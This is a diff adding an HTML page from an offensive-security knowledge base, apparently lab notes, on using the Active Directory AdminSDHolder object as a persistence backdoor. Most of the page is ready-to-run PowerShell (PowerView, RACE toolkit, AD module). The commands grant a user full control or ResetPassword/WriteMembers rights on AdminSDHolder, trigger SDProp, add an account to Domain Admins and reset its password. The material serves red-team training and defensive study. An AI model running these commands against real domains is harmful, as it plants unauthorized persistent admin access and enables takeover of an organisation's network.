@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3> PERSISTENCE - ACLs: AdminSDHolder </h3>
+
+Resides in the System container of a domain and used to control the permissions 
+-using an ACL - for certain built-in privileged groups (called Protected Groups). 
+
+>> GROUPS
+
+Account Operators | Enterprise Admins | Domain Controllers | Backup Operators | Administrators
+Print Operators | Schema Admins | Replicator | Read-Only Domain Controller
+
+Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder
+and any differences are overwritten on the object ACL.
+
+<b>::: ACCOUNTS THAT CAN BE ABUSSED</b>
+
+- Account Operators: Cannot modify DA/EA/BA groups. Can modify nested group within these groups.
+- Backup Operators: Backup GPO, edit to add SID of controlled account to a privileged group and Restore.
+- Server Operators: Run a command as system (using the disabled Browser service)
+- PrintOperators: Copy ntds.dit backup, load device drivers.
+
+>> With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism
+by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. 
+>> In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.
+
+<b>::: ADD FULLCONTROL PERMISSIONS FOR A USER TO THE AdminSDHolder USING POWERVIEW AS DA</b>
+
+PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 
+-Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+Using ActiveDirectoryModule and RACE toolkit (https://github.com/samratashok/RACE) :
+
+PS> Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -RightGeneric All 
+-DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
+
+<b>::: OTHER INTERESTING PERMISSIONS (ResetPassword, WriteMembers) FOR A USER TO THE AdminSDHolder</b>
+
+PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 
+-Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1
+-Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+
+<b>::: RUN SDProp MANUALLY USING Invoke-SDPropagator.ps1 FROM TOOLS DIRECTORY</b>
+
+PS> Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+
+<b>::: For pre-Server 2008 machines</b>
+
+PS> Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
+
+<b>::: CHECK THE DOMAIN ADMINS PERMISSIONS -PowerView AS NORMAL USER</b>
+
+PS> Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_| Add-Member NoteProperty 'IdentityName' 
+$(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+
+<b>::: USING ACTIVE DIRECTORY MODULE</b>
+
+PS> (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
+
+<b>::: ABUSING FULL CONTROL USING PowerView</b>
+
+PS> Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+
+<b>::: USING ACTIVE DIRECTORY MODULE</b>
+
+PS> Add-ADGroupMember -Identity 'Domain Admins' -Members testda
+
+<b>::: ABUSING RESET PASSWORD USING POWERVIEW</b>
+
+PS> Set-DomainUserPassword -Identity testda -AccountPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+
+<b>::: USING AD MODULE</b>
+
+PS> Set-ADAccountPassword -Identity testda -NewPassword(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+
+</center>
+</body>
+</html>
